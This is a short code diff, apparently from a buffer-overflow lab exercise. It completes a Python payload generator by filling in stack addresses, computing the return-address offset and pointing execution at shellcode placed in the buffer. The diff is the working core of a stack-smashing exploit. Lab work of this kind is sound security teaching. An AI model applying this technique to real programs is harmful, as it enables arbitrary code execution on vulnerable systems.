@@ -33,8 +33,11 @@ def createBadfile():
    # Put the shellcode at the end
    content[500-len(shellcode):] = shellcode
 
-   ret    = 0x00  # Need to change
-   offset = 0x00  # Need to change
+   base_pointer   = 0xffffd5e8
+   buffer_address = 0xffffd578
+
+   offset = base_pointer - buffer_address + 4
+   ret    = buffer_address + 500 - len(shellcode)
 
    content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
    ##################################################################
